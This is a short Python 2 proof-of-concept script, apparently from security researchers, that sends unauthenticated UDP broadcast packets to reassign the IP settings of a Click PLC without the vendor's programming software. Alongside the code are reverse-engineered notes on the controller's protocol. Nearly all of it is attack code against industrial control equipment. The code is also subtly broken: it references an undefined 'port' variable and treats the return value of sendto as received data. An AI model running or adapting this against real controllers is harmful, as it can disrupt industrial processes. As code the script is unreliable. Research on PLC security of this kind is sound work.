#!/usr/bin/python
# ======================================================================
#
# changeip.py
#
# This script tests to see if the IP address of a Click C0-10DD1E-D
# PLC can be changed without the legitimate programming software.
#
# Authors: Gary Roth, Dan Ritter, Rich Tanner
# Date: March 2017
#
# ======================================================================

import socket
import binascii
import struct
import time
import sys
import random

sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM) # UDP socket to send data out
rec = None  # holds received data from the Click PLC
srcIP = '192.168.0.20' # source IP address of sender
srcPort = random.randint(40000, 55000) # source port
dstport = 25425 # port number of PLC

# Packets to change IP settings from 192.168.0.101 to IP: 192.168.0.109, Subnet mask: 255.255.255.0, Gateway: 192.168.0.244
setup = binascii.unhexlify("4b4f50000a0074610e0045016683c0a8006500d07c120e4d") # packet that prepares the PLC to receive new IP data
change_ip = binascii.unhexlify("4b4f5000100043481d0045016682000100c0a80065c0a8006dffffff00c0a800f400d07c120e4d") # packet containing new IP data

# Packets to change IP settings from 192.168.0.109 to IP: 192.168.0.101, Subnet mask: 255.255.255.0, Gateway: 192.168.0.244
#setup = binascii.unhexlify("4b4f50000a00d9f20e0045016683c0a8006d00d07c120e4d") # packet that prepares the PLC to receive new IP data
#change_ip = binascii.unhexlify("4b4f5000100038ff1d0045016682000100c0a8006dc0a80065ffffff00c0a800f400d07c120e4d") # packet containing new IP data

# Bind socket and setup for broadcast (IP related packets are broadcasted to the whole LAN)
sock.bind((srcIP, srcPort))
sock.setsockopt(socket.SOL_SOCKET, socket.SO_BROADCAST, 1)
                                
# Send setup packet and check result
rec = sock.sendto(setup, ('<broadcast>', port))
if binascii.hexlify(rec[6:]) == "1d280700450166c2100000":
    print "Setup packet successful"
else:
    print "Setup packet failed"
time.sleep(.5)

# Send change IP packet and check result
rec = sock.sendto(change_ip, ('<broadcast>', port))
if binascii.hexlify(rec[6:]) == "763c0500450166c310":
    print "Change IP packet successful"
else:
    print "Change IP packet failed"    

# Misc notes -------------------------------------------------------

# Setup packet format
# Command TransID                     old IP
# 4b4f50 00 0a 00 fc53 0e0045016683   c0a8006b   00d07c120e4di

# Change IP packet format
# Command  TransID     Memory Addressing  old IP    new IP  subnetmask gateway
# 4b4f50 00 10 00 8192 1d0045016682000100 c0a8006b c0a8006c  ffffff00  c0a800f4 00d07c120e4d

# First 5 bytes of each packet are possibly the header of the custom protocol

# Possible message format
# Function(3 bytes) | null byte | Transaction ID(1 byte) | null byte | mystery 2 bytes | data (cpu instruction + operands)

# regular periodic traffic requests
# 4b4f50000700dec307004d014300020002
# 4b4f500008003d3605004d01650000


